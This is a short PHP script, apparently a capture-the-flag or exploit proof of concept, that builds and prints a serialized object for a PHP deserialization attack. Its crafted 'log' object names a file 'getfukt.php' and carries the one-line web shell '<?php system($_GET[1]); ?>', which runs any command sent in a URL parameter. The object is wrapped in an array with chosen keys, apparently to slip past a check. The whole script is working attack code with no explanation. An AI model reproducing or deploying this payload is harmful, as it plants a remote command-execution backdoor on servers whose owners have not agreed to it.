<?php

const fuck_you_key = 7896543210;
const fuck_ytou_too_key = 7;

function poon($object)
{
        $key = fuck_you_key;
        return [$key => $object, $key + 1 => $key];
}

class log
{
    public $logs = "getfukt.php";
    public $request = '<?php system($_GET[1]); ?>';
}
$logObj = new log;
$logObj = poon($logObj);
$serialized = serialize($logObj);
echo $serialized;

?>
